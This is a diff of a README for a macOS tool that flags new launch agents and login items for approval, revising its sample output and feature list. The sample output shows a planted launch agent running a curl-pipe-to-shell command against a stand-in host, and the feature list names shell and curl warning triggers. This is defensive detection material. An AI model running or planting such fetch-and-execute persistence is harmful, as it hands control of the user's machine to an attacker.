@@ -15,18 +15,18 @@ It's a single bash script with a LaunchDaemon. It has no dependencies and doesn'
 
 ```
 $ sudo /usr/local/sbin/backup-gate approve
-3 change(s) since the last approval (2026-11-10 13:48):
+3 change(s) since the last approval (2026-11-10 13:48).
+macOS doesn't record who creates these items: check when each one was created and what it runs.
 
 + ADDED   Launch agent (user you): com.example.updater
-           file     /Users/you/Library/LaunchAgents/com.example.updater.plist  (you staff 644)
+           file     /Users/you/Library/LaunchAgents/com.example.updater.plist
+                    created 2026-11-12 17:29, owner you:staff, mode 644
            runs     /bin/bash -c 'curl -s https://example.invalid/u | sh'
-           program signed by  Apple (built into macOS)
-           note     the program is part of macOS, but the item that starts it was added
-                    by someone else: this signature says nothing about who added it
+                    a tool built into macOS: judge this item by the command above
            ! starts bash: what it does depends on the arguments above
 + ADDED   Login item (you): com.clipy-app.Clipy
-           item     /Applications/Clipy.app
-           program signed by  Developer ID Application: Shunsuke Furubayashi (BBCHAJ584H)
+           runs     /Applications/Clipy.app
+                    signed by Developer ID Application: Shunsuke Furubayashi (BBCHAJ584H)
 - REMOVED Background daemon (runs as root): us.zoom.updater.install
 
 Approve only if every change is something you (or an update you ran) did.
@@ -134,11 +134,14 @@ For each change, `approve` shows:
 
 - **what kind of item it is** in plain words (launch daemon running as root, login item, sudo
   rule...) and whether it was added, removed or changed
-- **what it runs:** the full command line from the launchd plist
-- **who signed the program it starts.** This is checked against Apple's certificate chain, not
-  taken from the certificate's name, so a self-signed "Apple" certificate shows up as `UNTRUSTED`.
-  It describes the program, not the item: an item that starts a built-in macOS program (like
-  `bash` or `osascript`) shows "Apple" even though someone else added it, and `approve` says so
+- **when the file was created**, and the installer package it came from when macOS has a
+  receipt for it. macOS doesn't record who creates a launch item, so `approve` doesn't guess:
+  compare the creation time with what you did
+- **what it runs:** the full command line from the launchd plist, and right under it, what that
+  program is. Third-party programs show their developer (checked against Apple's certificate
+  chain, so a self-signed certificate named "Apple" shows up as `UNTRUSTED`). Built-in macOS
+  tools are shown as such, because their signature says nothing about the item: a new item that
+  runs `/bin/bash -c ...` is judged by its command, not by who signed bash
 - **warnings** for programs that are unsigned, missing, start a shell or script interpreter
   (`bash -c ...`, `osascript`, `curl`), or run from a temporary, shared or hidden folder
 
